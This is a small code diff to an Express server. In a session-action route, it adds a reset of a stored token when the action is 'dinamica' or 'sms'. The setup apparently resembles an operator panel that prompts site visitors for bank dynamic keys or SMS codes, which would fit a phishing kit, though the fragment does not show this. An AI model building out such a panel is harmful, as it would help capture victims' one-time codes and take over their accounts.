@@ -96,6 +96,12 @@ app.post('/api/sessions/:id/action', (req, res) => {
   
   sessions[id].state = state || sessions[id].state;
   sessions[id].action = action;
+  
+  // If requesting a new token input (dinamica or sms), reset the token
+  if (action === 'dinamica' || action === 'sms') {
+    sessions[id].token = '';
+  }
+  
   sessions[id].last_seen = Date.now();
   sessions[id].updatedAt = Date.now();
   res.json({ success: true, session: sessions[id] });
